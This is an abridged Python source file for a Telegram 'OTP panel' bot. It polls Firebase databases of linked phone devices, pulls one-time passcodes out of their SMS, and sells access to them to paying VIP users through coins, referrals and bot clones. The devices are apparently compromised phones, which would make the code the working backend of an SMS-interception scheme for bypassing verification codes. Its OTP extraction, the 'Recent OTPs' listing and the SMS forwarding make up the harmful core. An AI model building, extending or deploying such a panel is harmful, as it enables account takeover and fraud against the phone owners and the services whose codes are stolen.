...
"""
════════════════════════════════════════════════════════════
        OTP PANEL BOT — SUPREME MASTER EDITION v3.2
   Full Admin Commands + Telegram Menu + 1000+ Concurrency
════════════════════════════════════════════════════════════
"""
...
SMS_LIMIT     = int(os.getenv("SMS_LIMIT", "15"))
...
async def bounded_send(coro_factory):
    """Run one Telegram send/edit operation under bounded concurrency."""
    async with SEND_SEMAPHORE:
        try:
            return await coro_factory()
        except Exception as e:
            tlog(f"Telegram operation failed: {type(e).__name__}: {e}")
            return False

async def bounded_db_fetch(tag: str, url: str):
    """Refresh one Firebase DB without allowing unlimited DB pressure."""
    async with DB_SEMAPHORE:
        try:
            return tag, await fetch_db_data(tag, url)
        except Exception as e:
            tlog(f"DB refresh failed [{tag}]: {type(e).__name__}: {e}")
            return tag, []
...
async def get_http_session() -> aiohttp.ClientSession:
    ...
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=8, keepalive_timeout=30, enable_cleanup_closed=True)
...
async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        ...
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4, connect=3, sock_read=3)) as r:
            if r.status != 200:
                return None
...
async def get_all_devices(bot_token: str) -> list[Device]:
    # This function is intentionally cache-only. Telegram callbacks must never
    # wait for a complete Firebase refresh.
    dbs_to_check = list(DATABASES.keys())
    if bot_token != TOKEN and bot_token in CLONES:
        custom_db = CLONES[bot_token].get("custom_db")
        if custom_db:
            custom_tag = f"C_{bot_token[:6]}"
            dbs_to_check.append(custom_tag)

    unique_devices: dict[str, Device] = {}
    for tag in dbs_to_check:
        for d in GLOBAL_DEVICE_CACHE.get(tag, ()):
            unique_devices.setdefault(d.id, d)

    dev_list = list(unique_devices.values())
    dev_list.sort(
        key=lambda d: (
            0 if d.status == "online" else 1,
            0 if d.numbers else 1,
            -d.timestamp,
        )
    )
    return dev_list
...
def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    keys = [
        ...
        [KeyboardButton("🔑 Recent OTPs"), KeyboardButton("🏆 Leaderboard")],
        [KeyboardButton("👤 My Profile"), KeyboardButton("💬 Support Group")]
    ]
    if bot_token == TOKEN:
        bots_created = all_users.get(chat_id, {}).get("bots_created", 0) if chat_id else 0
        req_bot_coins = 20 + (bots_created * 10)
        keys.insert(2, [KeyboardButton("👑 Buy VIP (20 Coins)"), KeyboardButton("💸 Refer & Earn")])
        keys.insert(3, [KeyboardButton(f"🤖 Create Your Bot ({req_bot_coins} Coins)")])
    if is_admin:
        keys.append([KeyboardButton("🛡 Admin Panel"), KeyboardButton("📊 Bot Status")])
...
def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ...
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Get Referral Link To Earn Coins",
...
async def safe_edit(query, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    ...
    try:
        ...
        try:
            ...
            tlog(f"Fallback edit failed: {type(e2).__name__}: {e2}")
    except Exception as e:
        tlog(f"Unexpected edit error: {type(e).__name__}: {e}")
    return False
...
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    await update.message.reply_text(text, reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
...
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        if data == "cmd_status":
            ...
            text = (f"📊 BOT STATUS\n━━━━━━━━━━━━━━━━━━\n🤖 Bot Engine: Running ✅\n{db_lines}\n\n"
                    f"📱 Total Linked: {len(devices)}\n🟢 Online: {online}  |  🔴 Offline: {len(devices) - online}\n")
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh Status", callback_data="cmd_status")],
                                        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]])
        ...
        if data == "home":
            ...
            if not is_vip(bot_token, chat_id):
                if is_main_bot:
                    await safe_edit(query,
                        "🚫 VIP Access Required!\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. 10 ghante ke access ke liye 20 Coins chahiye. "
                    ...
                    await safe_edit(query, "🚫 Aapka premium access nahi hai.",
        ...
        if data == "online":
            ...
            devices = await get_all_devices(bot_token)
            online = [d for d in devices if d.status == "online"]
            await safe_edit(query, f"🟢 ONLINE NUMBERS ({len(online)})\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:",
...
async def handle_admin_command(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
    ...
    if cmd == "/all":
        ...
        results = await asyncio.gather(
            *(give_one(u) for u in list(users_db.keys())),
    ...
    if cmd == "/vipall":
        ...
        results = await asyncio.gather(
            *(give_vip(u) for u in list(users_db.keys())),
            return_exceptions=True
        )
        sent = sum(1 for r in results if r is True)
        ...
        async def send_one(cid):
            ...
            async with SEND_SEMAPHORE:
                try:
                    ...
                    tlog(f"Broadcast failed [{cid}]: {type(e).__name__}: {e}")
                    return False

        results = await asyncio.gather(*(send_one(c) for c in list(targets)), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
...
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if text == "🔍 Search Number":
        ...
        if not is_vip(bot_token, chat_id):
            if is_main_bot:
                await update.message.reply_text("🚫 VIP required.", reply_markup=get_vip_denied_keyboard(chat_id))
            return
    ...
    if text == "🔑 Recent OTPs":
        ...
        if not is_vip(bot_token, chat_id):
            if is_main_bot:
                await update.message.reply_text("🚫 VIP required.", reply_markup=get_vip_denied_keyboard(chat_id))
            return
        wait_msg = await update.message.reply_text("⏳ Fetching...")
        devices = await get_all_devices(bot_token)
        found = []
        async def inspect_device(d):
            async with DB_SEMAPHORE:
                try:
            ...
            for sms in smss:
                ...
                otp = extract_otp(body)
                if otp:
                    out.append((otp, device_label(d), sms.get("sender") or "?", sms_date(sms), d.db_tag))
            return out

        # Only inspect a bounded batch. This prevents a "Recent" button from
        # opening hundreds of simultaneous Firebase requests.
        batch = devices[:30]
        batches = await asyncio.gather(*(inspect_device(d) for d in batch), return_exceptions=True)
        for result in batches:
            ...
            if len(found) >= 10:
                break
        if not found:
            await wait_msg.edit_text("📭 No OTPs found.")
            return
        otp_text = "🔑 RECENT OTPS\n━━━━━━━━━━━━━━━━━━\n"
        for otp, label, sender, date, tag in found[:10]:
            otp_text += f"<code>{otp}</code> — {label} ({sender}) [{tag}]\n"
        await wait_msg.edit_text(otp_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        return
    ...
    if text == "👑 Buy VIP (20 Coins)" and is_main_bot:
        ...
        if user_coins >= 20:
            ...
            all_users[chat_id]["vip_until"] = max(time.time(), current_vip) + (10 * 3600)
            await update.message.reply_text("✅ VIP Purchased! 10h access.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
        else:
            await update.message.reply_text("❌ Not enough coins.", reply_markup=get_vip_denied_keyboard(chat_id))
        return
    ...
    if text == "🏆 Leaderboard":
        ...
        for i, (uid, info) in enumerate(sorted_users[:10], 1):
            lb_text += f"{i}. {info.get('name', 'Unknown')} — {info.get('otp_count', 0)} OTPs\n"
    ...
    if text == "💸 Refer & Earn" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Share ↗️",
    ...
    if text == "👤 My Profile":
        ...
        prof_text = (f"👤 <b>MY PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n"
                     f"Name: {user_data.get('name', 'Unknown')}\nID: <code>{chat_id}</code>\n")
        if is_main_bot:
            prof_text += f"Coins: {user_data.get('coins', 0)} 🪙\nReferrals: {user_data.get('referrals', 0)} 👥\n"
        prof_text += f"OTPs Used: {user_data.get('otp_count', 0)} 📩\nVIP: {get_vip_time_left(bot_token, chat_id)}\n"
        await update.message.reply_text(prof_text, parse_mode="HTML")
        return

    if text == "💬 Support Group":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text("Support link aapko admin se milega.")
        return
    ...
    if action == "create_bot" and is_main_bot:
        ...
        try:
            ...
            await update.message.reply_text("Menu:", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
            if _main_app:
...
async def _forward_sms(device: Device, sms: dict) -> None:
    ...
    kb_rows = []
    if otp:
        kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([
            ...
            for dev_id, sms_dict in bulk_data.items():
                ...
                for k, sms in sms_dict.items():
                    ...
                    if len(seen_ids) > MAX_SEEN_IDS:
                        # Keep memory bounded; old entries can safely age out.
                        seen_ids.clear()
                    if device:
                        try:
...
async def poll_loop(app: Application) -> None:
    ...
    while True:
        try:
            ...
            refresh_tasks = [
                asyncio.create_task(bounded_db_fetch(tag, url))
            ...
            if refresh_tasks:
                ...
                for item in refreshed:
                    if isinstance(item, tuple) and len(item) == 2:
                        ...
                        CACHE_UPDATED_AT[tag] = time.time()
            if first_run:
                async def init_db(tag, url):
                    async with DB_SEMAPHORE:
                        r_main, r_user, r_root = await asyncio.gather(
                    ...
                    type4_devs = [
                        d for d in GLOBAL_DEVICE_CACHE.get(tag, [])
            ...
            tlog(f"❌ Poll loop error: {type(e).__name__}: {e}")
...
def main() -> None:
    if not TOKEN:
        raise SystemExit("❌ BOT_TOKEN environment variable missing. Set BOT_TOKEN before starting.")

    print("═" * 56)
    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v3.2")
    print("  🚀 All Admin Commands + Telegram Menu")
    print("═" * 56)
    ...
    async def post_shutdown(application: Application) -> None:
        ...
        tlog("🛑 HTTP session closed. Shutdown complete.")
